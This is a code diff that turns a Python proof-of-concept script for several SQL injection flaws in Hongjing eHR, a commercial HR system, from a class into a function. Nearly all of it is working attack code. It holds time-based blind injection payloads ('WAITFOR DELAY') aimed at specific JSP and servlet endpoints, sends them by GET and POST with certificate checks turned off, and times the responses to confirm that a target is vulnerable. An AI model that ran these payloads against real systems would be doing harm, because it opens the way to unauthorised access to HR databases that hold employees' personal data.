@@ -13,21 +13,14 @@ import time
 import json
 import requests
 import warnings
-  
-
-
-class hjsoft_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['宏景EHR系统多处SQL注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payloads = [r"/pos/posbusiness/train_get_code_tree.jsp?codesetid=1%27%20WAITFOR%20DELAY%20%270:0:6%27--",
                     r"/system/report_orgtree.jsp?unitcode=3&report_type=1%20WAITFOR%20DELAY%20%270:0:6%27--"]
-        post_url = self.url + "/servlet/sys/option/customreport/tree"
+        post_url = url + "/servlet/sys/option/customreport/tree"
         post_data = {
             "id" : "' WAITFOR DELAY '0:0:6'--",
             "codeset":"null",
@@ -37,7 +30,7 @@ class hjsoft_sqli:
             "node":"3"
         }
         for payload in payloads:
-            vulnurl = self.url + payload
+            vulnurl = url + payload
             start_time = time.time()
             try:
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
@@ -66,5 +59,5 @@ class hjsoft_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = hjsoft_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
